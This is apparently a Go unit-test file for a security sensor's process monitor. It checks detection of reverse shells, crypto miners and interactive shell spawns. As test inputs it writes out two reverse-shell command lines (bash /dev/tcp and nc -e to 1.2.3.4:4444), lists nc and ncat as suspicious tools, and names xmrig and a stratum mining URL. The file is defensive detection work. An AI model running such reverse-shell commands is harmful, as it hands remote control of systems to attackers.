package procmon

import (
	"testing"
	"time"

	"github.com/sirupsen/logrus"

	"github.com/invisible-tech/autopilot-security-sensor/pkg/collector"
)

func TestNew(t *testing.T) {
	log := logrus.New()
	ch := make(chan collector.SecurityEvent, 1)
	pm := New(Config{
		ScanInterval:        time.Second,
		SuspiciousProcesses: []string{"nc", "ncat"},
		EventChan:           ch,
	}, log)
	if pm == nil {
		t.Fatal("New returned nil")
	}
}

func TestProcessMonitor_isReverseShell(t *testing.T) {
	log := logrus.New()
	pm := New(Config{ScanInterval: time.Second, EventChan: make(chan collector.SecurityEvent, 1)}, log)
	if !pm.isReverseShell("bash -i >& /dev/tcp/1.2.3.4/4444") {
		t.Error("bash -i /dev/tcp should be reverse shell")
	}
	if !pm.isReverseShell("nc -e /bin/sh 1.2.3.4 4444") {
		t.Error("nc -e should be reverse shell")
	}
	if pm.isReverseShell("sleep 1") {
		t.Error("sleep should not be reverse shell")
	}
}

func TestProcessMonitor_isCryptoMiner(t *testing.T) {
	log := logrus.New()
	pm := New(Config{ScanInterval: time.Second, EventChan: make(chan collector.SecurityEvent, 1)}, log)
	if !pm.isCryptoMiner("xmrig", "") {
		t.Error("xmrig should be cryptominer")
	}
	if !pm.isCryptoMiner("myapp", "stratum+tcp://pool.example.com:3333") {
		t.Error("stratum pool should be cryptominer")
	}
	if pm.isCryptoMiner("bash", "") {
		t.Error("bash should not be cryptominer")
	}
}

func TestProcessMonitor_isShellSpawn(t *testing.T) {
	log := logrus.New()
	pm := New(Config{ScanInterval: time.Second, EventChan: make(chan collector.SecurityEvent, 1)}, log)
	if !pm.isShellSpawn(&ProcessInfo{Name: "bash", Cmdline: []string{"bash", "-i"}}) {
		t.Error("bash -i should be shell spawn")
	}
	if !pm.isShellSpawn(&ProcessInfo{Name: "sh", Cmdline: []string{"sh", "-il"}}) {
		t.Error("sh -il should be shell spawn")
	}
	if pm.isShellSpawn(&ProcessInfo{Name: "bash", Cmdline: []string{"bash", "script.sh"}}) {
		t.Error("bash script.sh should not be shell spawn")
	}
	if pm.isShellSpawn(&ProcessInfo{Name: "sleep", Cmdline: []string{"sleep", "1"}}) {
		t.Error("sleep should not be shell spawn")
	}
}
